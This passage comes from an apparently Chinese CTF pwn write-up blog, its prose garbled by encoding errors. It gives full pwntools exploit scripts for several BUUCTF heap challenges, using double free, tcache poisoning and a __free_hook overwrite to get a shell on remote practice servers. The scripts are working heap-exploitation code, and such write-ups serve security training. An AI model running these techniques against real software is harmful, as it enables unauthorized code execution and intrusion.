class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27964</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Input your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the size of story: \n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;please inpute the story: \n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Input your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------</span><br>sla(<span class="hljs-string">&#x27;What\&#x27;s your name?\n&#x27;</span>,<span class="hljs-string">&#x27;nq&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Please input your ID.\n&#x27;</span>,<span class="hljs-string">&#x27;pppppppp&#x27;</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;setbuffer&#x27;</span>]-<span class="hljs-number">231</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x60</span>,p64(free_hook))<br>add(<span class="hljs-number">0x60</span>,p64(free_hook))<br>add(<span class="hljs-number">0x60</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>æœ€åï¼Œé‚£ä¸ªæœ‰fortifyä¿æŠ¤ï¼Œå¥½åƒä¹Ÿèƒ½åˆ©ç”¨æ¥æ³„éœ²<br>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://www.cnblogs.com/remon535/p/14122719.html">https://www.cnblogs.com/remon535/p/14122719.html</a></p><h3 id="icoctf-2018-are-you-root">icoctf_2018_are you root</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121140324?spm=1001.2014.3001.5502">picoctf_2018_are you root_Nqoinaençš„åšå®¢-CSDNåšå®¢</a><br>ç¨‹åºåŠŸèƒ½åˆ°è¾¾level5èƒ½æ‰“å‡ºflagï¼Œæ­£å¸¸è¿è¡Œçš„è¯ä¸ä¼šè®©ä½ åˆ°è¾¾level5</p><h4 id="ç›´æ¥è¯´è§£æ³•ï¼š">ç›´æ¥è¯´è§£æ³•ï¼š</h4><p>å°±æ˜¯è¾“nameçš„æˆ‘ä»¬å¡«æ»¡8ä¸ªaï¼Œç„¶åå°±å¯ä»¥æ”¹åˆ°levelå‚æ•°<br>strdupä¼šæŠŠname copyä¸‹å»ï¼ŒåŒ…æ‹¬levelå‚æ•°ï¼Œæˆ‘ä»¬freeå®ƒçš„è¯ï¼Œé‡Šæ”¾åˆ°tcachebin0x20ï¼Œlevelå‚æ•°è¿˜åœ¨ï¼Œæˆ‘ä»¬å†loginçš„è¯ï¼Œå¦‚æœæ˜¯0x20å¤§å°ï¼Œå°±ä»tcachebinä¸­å–ï¼Œlevelå‚æ•°æœªåˆå§‹åŒ–ï¼Œè¿˜æ˜¯5ã€‚å°±èƒ½æ¥å—flagäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./PicoCTF_2018_are_you_root&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29317</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;login aaaaaaaa&#x27;</span>+p64(<span class="hljs-number">5</span>))<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;reset&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;login aaaa&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;get-flag&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-YDSneedGrirlfriend">bjdctf_2020_YDSneedGrirlfriend</h3><p>ï¼ˆuafï¼‰</p><p>åˆ©ç”¨æ€è·¯ï¼š<br>ç”³è¯·sizeåŒä¸º0x20å¤§å°çš„chunkï¼Œ<br>doublefree<br>ç”³è¯·ä¸ªä¸åŒsizeçš„chunkï¼Œä½¿ä»biné“¾ä¸­å–å‡ºä¸€ä¸ª0x20<br>ä½ç½®å°±ç½®æ¢äº†ï¼Œæˆ‘ä»¬å°±èƒ½æ§åˆ¶å‰é¢å›¾ç‰‡ä¸­è¯´çš„è¦æ”¹çš„é‚£ä¸ªæŒ‡é’ˆçš„å€¼äº†<br>æˆ‘ä»¬add 0x20 sizeï¼ŒæŠŠå®ƒæ”¹ä¸ºåé—¨åœ°å€<br>ç„¶åshowå°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./bjdctf_2020_YDSneedGrirlfriend&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27737</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Her name size is :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Her name is :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#---------------------------------</span><br>backdoor=<span class="hljs-number">0x400b9c</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(backdoor))<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-signin">gyctf_2020_signin</h3><p>å‚è€ƒå¸ˆå‚…ï¼š<a href="https://blog.csdn.net/yongbaoii/article/details/114242840?ops_request_misc=%7B%22request%5Fid%22%3A%22163603094916780261991969%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163603094916780261991969&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-114242840.pc_search_mgc_flag&amp;utm_term=gyctf_2020_signin&amp;spm=1018.2226.3001.4187">yongbaoii</a></p><p>calloc æœ‰ä»¥ä¸‹ç‰¹æ€§</p><p>ä¸ä¼šåˆ†é… tcache chunk ä¸­çš„ chunk ã€‚</p><p>tcache æœ‰ä»¥ä¸‹ç‰¹æ€§</p><p>åœ¨åˆ†é… fastbin ä¸­çš„ chunk æ—¶è‹¥è¿˜æœ‰å…¶ä»–ç›¸åŒå¤§å°çš„ fastbin_chunk åˆ™æŠŠå®ƒä»¬å…¨éƒ¨æ”¾å…¥ tcache ä¸­ã€‚</p><p>å¤§è‡´æ€è·¯ï¼š<br>æœ€ç»ˆç›®çš„å°±æ˜¯æŠŠbiné“¾å†™åˆ°ptré‡Œ<br>å°±æ˜¯åˆ©ç”¨ä¸Šé¢çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬è¦åˆ›é€ ä¸ªfastbinchunkç»™ä»–åˆ†é…ï¼Œåˆ©ç”¨uafæ”¹å†™fdï¼Œä½¿fastbiné“¾æŒ‡å‘ptr<br>æˆ‘ä»¬addä¸€ä¸ªï¼Œåœ¨tcacheç•™ä¸ªç©ºä½ï¼Œcallocåˆ†é…ä¸€ä¸ªfastbinï¼Œç¬¬äºŒä¸ªç‰¹æ€§æŠŠptræŒ‚å…¥tcachebinï¼Œä¹Ÿå°±æ˜¯å†™äº†ç‚¹æ•°æ®<br>ï¼ˆ-0x10ï¼Œä¼°è®¡ä¹Ÿæ˜¯ç‰¹æ€§ï¼Œå…·ä½“ä½ç½®çš„è¯å¯ä»¥è°ƒè¯•çœ‹çœ‹ï¼‰</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_signin&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26068</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------------------------------------------------</span><br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">7</span>)<br>edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span>-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="actf-2019-babyheap">actf_2019_babyheap</h3><p>ä¸€èˆ¬æœ‰æ—¶é—´çš„å°±æœ‰system</p><p>æ²¡å•¥å¥½è¯´çš„<br>å¯ä»¥çœ‹æˆ‘å‰é¢çš„æ–‡ç« ï¼š<br><a href="https://blog.csdn.net/m0_51251108/article/details/121141201?spm=1001.2014.3001.5502">https://blog.csdn.net/m0_51251108/article/details/121141201?spm=1001.2014.3001.5502</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ACTF_2019_babyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = 